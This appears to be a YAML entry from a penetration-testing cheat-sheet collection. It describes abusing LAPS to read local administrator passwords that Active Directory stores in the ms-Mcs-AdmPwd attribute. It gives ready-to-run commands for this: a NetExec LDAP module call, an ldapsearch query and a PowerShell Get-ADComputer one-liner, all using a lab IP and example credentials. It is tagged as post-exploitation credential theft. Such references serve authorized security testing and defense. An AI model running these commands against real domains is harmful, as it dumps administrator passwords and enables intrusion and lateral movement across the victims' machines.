---
description: |
  LAPS (Local Administrator Password Solution) abuse — read local administrator passwords stored in Active Directory if permissions allow.
commands:
  - have: Credentials
    cmd: |
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M laps
      ldapsearch -x -H ldap://10.10.10.27 -D "sec_user@senshu.sh" -w 'P@ssw0rd' -b "DC=senshu,DC=sh" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
  - have: Shell
    cmd: |
      Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - Credential_Theft
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html
  - https://www.netexec.wiki/
  - https://github.com/p0dalirius/pyLAPS
---
